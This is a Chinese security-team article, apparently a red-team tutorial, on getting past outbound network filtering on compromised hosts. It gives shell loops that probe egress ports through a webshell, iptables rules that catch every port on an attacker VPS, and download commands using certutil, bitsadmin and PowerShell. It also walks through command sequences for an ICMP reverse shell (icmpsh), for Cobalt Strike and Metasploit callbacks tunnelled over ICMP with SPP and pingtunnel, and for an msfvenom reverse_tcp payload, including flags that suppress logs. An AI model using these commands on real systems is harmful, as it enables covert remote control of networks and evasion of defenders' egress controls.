---
title: 隧道与端口转发
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247500821&idx=1&sn=0744e1785243452a5f3dfb035b1827ea&chksm=ce5de674f92a6f62e5027f82683d44bda75f80159c29f5a903d520bfcfd09d0c45161be29ab1&scene=58&subscene=0#rd
source: Tide安全团队
date: 2022-10-20
fetch_date: 2025-10-03T20:23:34.392684
---

# 隧道与端口转发

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpPhgIciaiciccHLBQ8Jq5z4MfQlnGQTMqNib4BcJh5ZudAq611rUfyJhyWsA/0?wx_fmt=jpeg)

# 隧道与端口转发

原创

komorebi

Tide安全团队

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

## 出网探测

出网探测就是要探测出网协议,出站ip和出站端口。查看是否禁止了出站ip或者禁止了出站端口或者禁止了出站协议。

### 目标禁止出站ip

如果目标主机设置了严格的策略，防火墙只允许目标内网机器主动连接公网指定的ip。这样的话，没法反弹shell。（因为白名单ip没有办法拿到权限）。

### 禁止出站端口

Linux系统使用Linux系统自带命令探测出网端口。( 探测目标机器可以访问baidu.com对应ip的端口)

```
for i in {440..449};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i***********************open************************" || echo "$i closed";done
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpPhAt20X3hyvhoUaBdhe8IG4jYEpLDibnz5TCP9OP03iaeoSqGcQxrSLCw/640?wx_fmt=png "null")

webshell不好回显结果，将结果写入文件中

```
for i in {440..449};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************"|| echo "$i closed";done >> result.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpP62yiaJfsTl1CTlOQCftxibarCVlfKkJjdEbEMalVFVd9qY3yCm27qlag/640?wx_fmt=png "null")

### 探测常见端口

```
for i in {21,22,23,25,53,80,88,110,137,138,139,123,143,389,443,445,161,1521,3306,3389,6379,7001,7002,8000,8001,8080,8090,9000,9090,11211};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed";done
```

```
for i in {21,22,23,25,53,80,88,110,137,138,139,123,143,389,443,445,161,1521,3306,3389,6379,7001,7002,8000,8001,8080,8090,9000,9090,11211};do timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed";done >> result.txt
```

## 攻击端的端口请求记录

从目标发起的端口访问请求，攻击端必须得配合记录，否则即便找到有效的出站端口，我们也无法获悉。思路一，单个逐次监听端口。对于少量端口的探测，攻击端很容易记录。比如，要验证 windows 目标的 8088 端口是否为出站端口，先在攻击端用 nc -n -v -lp 8088 监听 8088，指定 -v 选项观察实时访问记录，再在目标上用 telnet 192.168.56.8 8088 连接攻击端的 8088 端口，最后在攻击端查看端口访问记录，若有则该端口是有效出站端口,若无则重复以上步骤继续验证其他端口。

二，批量捆绑监听端口。试想一下，如果能够把攻击端的多个端口流量转发至单个汇聚端口，就只需监听单个汇聚端口，目标上发起多个端口探测，只要在攻击端转发的多个端口的范围内，那么，一旦找到有效出站端口，攻击端的汇聚端口一定有访问记录。说到端口转发，系统自带的 ssh、iptables，三方的 frp、nps，这些工具都能高效实现，于是，我从这四个工具中找寻具备端口捆绑能力的那位 攻击端这边需要有⽬标机访问的记录，才能更好的判断⽬标机器是否访问了我们。只要⽬标机器访问到 了我们VPS的任意⼀个端⼝，我们这边都能有记录。//将所有端⼝的流量都绑定到34444端⼝

```
iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 34444
```

//查看nat表的规则

```
iptables -t nat -nvL
```

//清除nat表所有规则

```
iptables -t nat -F
```

//备份iptables规则

```
iptables-save > /tmp/firewall.rules
```

//恢复iptables规则

```
iptables-restore < /tmp/firewall.rules
```

配置防⽕墙规则，禁⽌访问远程机器的1-34566和34566-65535端⼝，也就是说只允许访问34567端⼝然后我们这边监听34444端⼝，在⽬标机器端⼝探测

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpPgbIiaicdybrWMAOYBjxROuSia8yoibZWhgicibqI9mbZmWtGqtF5CFPU3RFw/640?wx_fmt=png "null")

## 禁止出站协议

对于禁止出站协议的情况，需要探测目标机器允许哪些协议出网。

### 探测ICMP协议服务端

监听ICMP流量：

```
tcpdump icmp
```

客户端ping VPS地址，查看服务端能否收到请求VPS监听，然后ping我们vps查看能否收到监听来判断ICMP 协议是否出⽹。也可以直接ping⼀个地址，看是否 有ttl值。

### 探测DNS协议

Windows：

```
nslookup、ping
```

Linux：

```
nslookup、dig、ping
```

通过判断能否将域名解析为ip，判断DNS协议是否出⽹。也可以将域名换成dnslog的域名，再看dnslog能否收到请求。

## 探测HTTP协议

Linux：可以使用curl命令

```
curl http://192.168.10.13
```

Windows系统可以使用如下的命令

```
certutil -urlcache -split -f http://www.baidu.com
bitsadmin /transfer test http://192.168.10.13/1 c:\1
powershell iwr -Uri http://www.baidu.com -OutFile 1 -UseBasicParsing
```

## 只有ICMP协议出网

目标只有icmp协议能出⽹的话，则只有考虑使⽤icmp协议来搭建隧道。利⽤icmp协议通信的⼯具有很多icmpsh、reverse-icmp-shell、PingTunnel、IcmpTunnel都可以。常⻅的ping命令就是利⽤的ICMP协议。

### icmpsh（2016+kali2017）

icmpsh 是一个简单的反向 ICMP shell，带有一个 win32 从站和一个 C、Perl 或 Python 中的兼容主站。与其他类似的开源工具相比，它的主要优势在于它不需要管理权限即可在目标机器上运行。使用ICMP进行命令控制（Icmpsh）适⽤场景：⽬标机器是Windows服务器 Linux服务器执行

```
#关闭icmp回复,如果要开启icmp回复，该值设置为0
sysctl -w net.ipv4.icmp_echo_ignore_all=1
#运⾏，第⼀个IP是VPS的eth0⽹卡IP(vps上ifconfig可以得到)，第⼆个IP是⽬标机器出⼝的公⽹IP
python2 icmpsh_m.py 192.168.10.8 192.168.10.7
```

目标机器的操作：

```
icmpsh.exe -t 192.168.10.8
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpPuPnkx6EAyBEuz3KEACia58htFObFclw2TjM9O2EoUqlthuyJhGndMjg/640?wx_fmt=png "null")

可以看到已经反弹出一个shell

## ICMP上线CS

有如下场景，我们拿到了内⽹的机器权限。但是机器对外均只有icmp协议出网，我们现在可以利⽤icmp封装tcp协议，让其上线cs。

### 使用SPP

平常演练常用的一些隧道工具像frp，nps在目标出网的情况下还是比较好用的。但是一旦遇到一些比较恶劣的环境，比如只有icmp可以出网的情况，那就需要使用其他的工具像pingtunnel，ptunnel等。SPP三个特点：、 支持icmp、kcp、quic 支持双向的代理 可以自由进行内部外协议的组合

功能：支持的协议：tcp、udp、rudp(可靠udp)、ricmp(可靠icmp)、rhttp(可靠http)、kcp、quic 支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理 协议和类型可以自由组合 外部代理协议和内部转发协议可以自由组合 支持shadowsock/s插件，spp-shadowsock/s-plugin，spp-shadowsock/s-plugin-android cs服务器端

```
./spp -type server -proto ricmp -listen 0.0.0.0
```

客户端

```
spp -name "test" -type proxy_client -server 140.143.167.58 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVyjaGiaUewQnZLUZgaMzUpP5Kqo9hJ4XOpxxdGQ1vZD5CqZe8tqAx6Er7yo7PVhpqjUQHetiaFCGZw/640?wx_fmt=png "null")

## pingtunnel上线MSF&CS

1、pingtunnel下载链接

```
https://github.com/esrrhs/pingtunnel/releases
```

注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件；ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密 2 vps服务端开启

```
##开启服务器模式
./pingtunnel -type server
```

3、客户端开启上传客户端

```
## 客户端本地监听9999端口 ，将监听到的连接通过icmpserver发送到Linsten_ip:7777端口
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t  82.157.64.237:7778 -tcp 1 -noprint 1 -nolog 1
```

4、MSF上线

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o AAA.exe
```

5、cs上线 建立监听127.0.0.1:9999和192.168.3.76:7777 对127的监听生成木马AAA.exe，传到靶机运行

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 192.168.3.76 -t 192.168.3.76:7777 -tcp 1 -noprint 1 -nolog 1
```

E

N

D

**关**

**于**

**我**

**们**

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web安全、移动终端、安全开发、物联网/工控安全/AI安全等多个领域。

团队作为“省级等保关键技术实验室”先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目60余项，获得各类自主知识产权30余项，省市级科技项目立项20余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXKdic2aeSueSKVcSe4bg4FWpNcMVuVlfknlaOFhE5qxE5QhwDUrw1tAb8eibJcxIbqPicibfnAZibfg4A/0?wx_fmt=png)

Tide安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXKdic2aeSueSKVcSe4bg4FWpNcMVuVlfknlaOFhE5qxE5QhwDUrw1tAb8eibJcxIbqPicibfnAZibfg4A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过